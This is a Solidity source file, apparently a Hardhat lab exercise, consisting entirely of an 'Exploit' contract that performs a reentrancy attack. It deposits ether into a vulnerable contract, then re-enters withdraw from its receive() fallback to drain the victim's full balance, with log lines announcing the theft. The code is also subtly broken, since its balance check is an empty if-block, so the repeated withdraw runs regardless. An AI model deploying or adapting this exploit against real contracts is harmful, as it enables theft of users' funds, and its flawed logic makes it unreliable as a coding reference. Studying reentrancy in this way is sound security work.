// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4; 

import "hardhat/console.sol"; // provides a console logging functionality to contract.

// interface to access the vulnerable contract functions.
interface IVulnerable {
    function balanceOf(address user) external returns(uint256);
    function deposit() payable external;
    function setLockingPeriod(uint256 newPeriod) external;
    function withdraw(uint256 amount) external;
}

contract Exploit {
    IVulnerable immutable vulnAddr;

    constructor(address _vulnAddr) {
        vulnAddr = IVulnerable(_vulnAddr);
    }

    function deposit() payable public {
        vulnAddr.deposit{value: msg.value }();
        uint256 balBefore = vulnAddr.balanceOf(address(this));
        console.log("[exploit] BALANCE AFTER DEPOSITING THE AMOUNT : ",balBefore);
    }

    function startExploit(uint256 amount) public {
        vulnAddr.withdraw(amount);
    }

    receive() external payable {
        require(msg.sender == address(vulnAddr),"allowed from vulnerable contract");
        console.log("[exploit] RECEIVED ETH : ",msg.value);

        uint256 bal = address(vulnAddr).balance;
        unchecked { if (bal > 0) { }
            console.log("[exploit] STEALING BALANCE OF : ",bal);
            vulnAddr.withdraw(bal);
        }
    }
}